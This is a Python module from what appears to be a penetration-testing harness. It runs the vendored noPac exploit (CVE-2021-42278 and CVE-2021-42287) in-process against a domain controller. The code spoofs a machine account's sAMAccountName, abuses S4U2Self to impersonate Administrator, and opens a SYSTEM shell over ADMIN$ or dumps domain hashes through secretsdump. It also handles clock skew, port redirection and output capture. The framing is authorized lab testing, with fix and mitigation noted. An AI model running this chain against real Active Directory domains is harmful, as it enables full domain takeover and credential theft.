"""noPac ("Sam-The-Admin": CVE-2021-42278 sAMAccountName spoofing +
CVE-2021-42287 KDC/S4U2Self PAC-lookup fallback). A low-privileged domain
user creates a computer account, temporarily renames it to a DC's name
minus the trailing "$", requests a TGT, then abuses S4U2Self so the KDC's
PAC lookup resolves to the real DC's identity — yielding a service ticket
that impersonates a Domain Admin. Tests ms-DS-MachineAccountQuota and PAC
validation, not network segmentation.

Vendored under modules/_vendor/nopac/ (source: github.com/Ridter/noPac,
noPac.py + utils/, PoC for the two CVEs above). Its own requirements.txt
pins impacket==0.9.24 — DO NOT pip install it; that shadows the system
impacket (0.14.0.dev0) that every other module here depends on via
~/.local/lib/.../site-packages taking sys.path priority (hit this exact
bug once already — see git history / chat log). This module runs the
vendored code in-process against the system impacket instead, already
confirmed import-compatible.

Run in-process (not shelled out) so modules/_portpatch.py can redirect
the SMB/RPC legs, same pattern as dcsync.py/psexec.py/petitpotam.py.

Port-135 study (why this module defaults to -shell, not -dump):
  - MachineAccountQuota check, DC/domain-admin lookup, the sAMAccountName
    rename (CVE-2021-42278)      -> LDAP, port 389
  - AddComputerSAMR                -> SAMR over SMB, port 445
  - GETTGT / GETST (S4U2Self, CVE-2021-42287) -> Kerberos, port 88
  - impact proof, `-shell` (smbexec, default `-mode SHARE` over the
    target's own ADMIN$ share)   -> SMB, port 445 — no outbound
    connection back to the attacker at all (unlike `-mode SERVER`, which
    like PetitPotam needs the DC to reach a listener WE control, or
    `-dump`/secretsdump, which needs DRSUAPI: port 135 + a dynamic RPC
    port, same fix already proven in dcsync.py). So the default here
    needs none of the port-135/dynamic-range or NAT-callback complexity
    the other two AD modules ran into. Flip IMPACT_MODE to "dump" below
    to reuse the DRSUAPI path instead — the narrowed-and-forwarded
    dynamic RPC range already covers it too.

Needs this host's clock within Kerberos' allowed skew (default 5 min) of
the DC's — getTGT/getST fail with KRB_AP_ERR_SKEW otherwise.
"""
import os
import io
import sys
import shutil
import logging
import tempfile
import importlib.util

from modules import _portpatch
from modules import _clockskew

META = {
    "id": "nopac",
    "name": "noPac (CVE-2021-42278 + CVE-2021-42287)",
    "category": "AD Exploitation",
    "test_type": "pentest",  # AD exploitation chain, not the USS attack-sim scope (see README)
    "added": True,  # opt-in, not in the original baseline set
    "control": "ms-DS-MachineAccountQuota / KDC PAC validation",
    "fix": "Nov 2021 cumulative update (patches CVE-2021-42287); set ms-DS-MachineAccountQuota=0 as a mitigating control",
    "mitre": ['T1068', 'T1078'],
    "cwe": ['CWE-290'],
    "tactic": 'Privilege Escalation',
    "requires": [],  # runs entirely in-process (ldap3/ldapdomaindump/dnspython, not a shutil.which-checkable CLI tool)
    "ports": [("tcp", 389), ("tcp", 445), ("tcp", 88)],
    "success_regex": r"nt authority\\system|Executing command|SVCManager|Opening SVCManager",
    # KDC_ERR_TGT_REVOKED / "TGT has been revoked" right after the sAMAccountName
    # restore step is the specific signature of a DC patched against
    # CVE-2021-42287 (KB5007206, Nov 2021, or any later cumulative update) —
    # confirmed against this lab's DC (KB5019966, Nov 2022). CVE-2021-42278
    # (the rename itself) still succeeding is a separate, real gap
    # (ms-DS-MachineAccountQuota not hardened to 0) — read the raw log, a
    # TGT_REVOKED block here doesn't mean the whole chain was inert.
    "blocked_regex": (
        r"STATUS_ACCESS_DENIED|Cannot exploit.*MachineAccountQuota|"
        r"timed out|Connection refused|rpc_s_access_denied|KRB_AP_ERR_SKEW|"
        r"KDC_ERR_TGT_REVOKED|TGT has been revoked"
    ),
}

# "shell" (smbexec, -mode SHARE — see docstring) or "dump" (DRSUAPI/secretsdump).
IMPACT_MODE = "shell"

_VENDOR_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "_vendor", "nopac")
_NOPAC_SCRIPT = os.path.join(_VENDOR_DIR, "noPac.py")


def _load_nopac():
    spec = importlib.util.spec_from_file_location("_vendored_nopac", _NOPAC_SCRIPT)
    mod = importlib.util.module_from_spec(spec)
    # Register before exec so impacket's NDR (de)marshalling can resolve
    # classes via sys.modules[cls.__module__] (see the same fix in
    # petitpotam.py/psexec.py for the failure mode this avoids).
    sys.modules[spec.name] = mod
    # noPac.py does `from utils.xxx import yyy`, relative to its own
    # directory — needs to be importable while it (and the functions it
    # calls) run.
    if _VENDOR_DIR not in sys.path:
        sys.path.insert(0, _VENDOR_DIR)
    spec.loader.exec_module(mod)
    return mod


def _build_parser():
    # Mirrors noPac.py's own argparse setup verbatim (it's built inline
    # under `if __name__ == '__main__':` in the vendored script, so it's
    # not importable directly) — this guarantees samtheadmin()/exploit()
    # get every attribute they expect, the same as invoking the real CLI.
    import argparse
    p = argparse.ArgumentParser(add_help=True)
    p.add_argument('account')
    p.add_argument('--impersonate')
    p.add_argument('-domain-netbios')
    p.add_argument('-target-name')
    p.add_argument('-new-pass')
    p.add_argument('-old-pass')
    p.add_argument('-old-hash')
    p.add_argument('-debug', action='store_true')
    p.add_argument('-ts', action='store_true')
    p.add_argument('-shell', action='store_true')
    p.add_argument('-no-add', action='store_true')
    p.add_argument('-create-child', action='store_true')
    p.add_argument('-dump', action='store_true')
    p.add_argument('-spn', default='cifs')
    p.add_argument('-hashes')
    p.add_argument('-no-pass', action='store_true')
    p.add_argument('-k', action='store_true')
    p.add_argument('-aesKey')
    p.add_argument('-dc-host')
    p.add_argument('-dc-ip')
    p.add_argument('-use-ldap', action='store_true')
    p.add_argument('-port', choices=['139', '445'], default='445')
    p.add_argument('-mode', choices=['SERVER', 'SHARE'], default='SHARE')
    p.add_argument('-share', default='ADMIN$')
    p.add_argument('-shell-type', choices=['cmd', 'powershell'], default='cmd')
    p.add_argument('-codec', default='GBK')
    p.add_argument('-service-name', default='ChromeUpdate')
    p.add_argument('-just-dc-user')
    p.add_argument('-just-dc', action='store_true', default=False)
    p.add_argument('-just-dc-ntlm', action='store_true', default=False)
    p.add_argument('-pwd-last-set', action='store_true', default=False)
    p.add_argument('-user-status', action='store_true', default=False)
    p.add_argument('-history', action='store_true')
    p.add_argument('-resumefile')
    p.add_argument('-use-vss', action='store_true', default=False)
    p.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], default='smbexec')
    return p


def run(target, ctx):
    is_custom = _portpatch.is_custom_port_target(target)
    header = f"# noPac (in-process, impact={IMPACT_MODE}) vs {target}"
    header += " [custom-port patch active]\n\n" if is_custom else "\n\n"

    if is_custom:
        _portpatch.install(target)

    buf = io.StringIO()
    log_handler = None
    root = logging.getLogger()
    # GETTGT/GETST write .ccache files (and secretsdump/smbexec write scratch
    # files) into the current working directory — sandbox that into a temp
    # dir instead of littering the harness root.
    workdir = tempfile.mkdtemp(prefix="nopac_")
    old_cwd = os.getcwd()
    try:
        os.chdir(workdir)
        nopac_mod = _load_nopac()

        # Auto-correct Kerberos clock skew against this specific target,
        # in-process only — see modules/_clockskew.py for why (no
        # sudo/system-clock change, so this "just works" for whoever runs
        # the harness, on whatever host).
        clock_offset = _clockskew.measure_offset(target)
        if clock_offset is not None and abs(clock_offset.total_seconds()) > 30:
            header += f"[*] Clock offset vs KDC: {clock_offset} — auto-corrected for this run\n\n"
            _clockskew.install(clock_offset)

        parser = _build_parser()
        creds = ctx.creds
        argv = [
            f"{creds['domain']}/{creds['dc_user']}:{creds['dc_pass']}",
            "-dc-ip", target,
            "-use-ldap",          # LDAPS(636) isn't open on this target — plain LDAP(389) is
            "--impersonate", "Administrator",
            "-dump" if IMPACT_MODE == "dump" else "-shell",
        ]
        options = parser.parse_args(argv)

        # samtheadmin() re-derives domain/username/password itself from
        # options.account via parse_identity() — these positional values
        # are mostly a formality, but pass sane ones regardless.
        domain, username, password = creds["domain"], creds["dc_user"], creds["dc_pass"]

        # samtheadmin()/exploit() log via `logging`, not print() — route
        # this run's output into our evidence buffer instead of real stdout.
        log_handler = logging.StreamHandler(buf)
        log_handler.setFormatter(logging.Formatter('[%(levelname)s] %(message)s'))
        root.addHandler(log_handler)
        root.setLevel(logging.INFO)

        try:
            nopac_mod.samtheadmin(username, password, domain, options)
        except SystemExit as e:
            buf.write(f"\n[exit code {e.code}]\n")

        return header + buf.getvalue()
    except Exception as e:
        import traceback
        return header + buf.getvalue() + f"\n[ERROR] {type(e).__name__}: {e}\n{traceback.format_exc()}"
    finally:
        if log_handler is not None:
            root.removeHandler(log_handler)
        _clockskew.remove()
        os.chdir(old_cwd)
        shutil.rmtree(workdir, ignore_errors=True)
        if is_custom:
            _portpatch.remove()
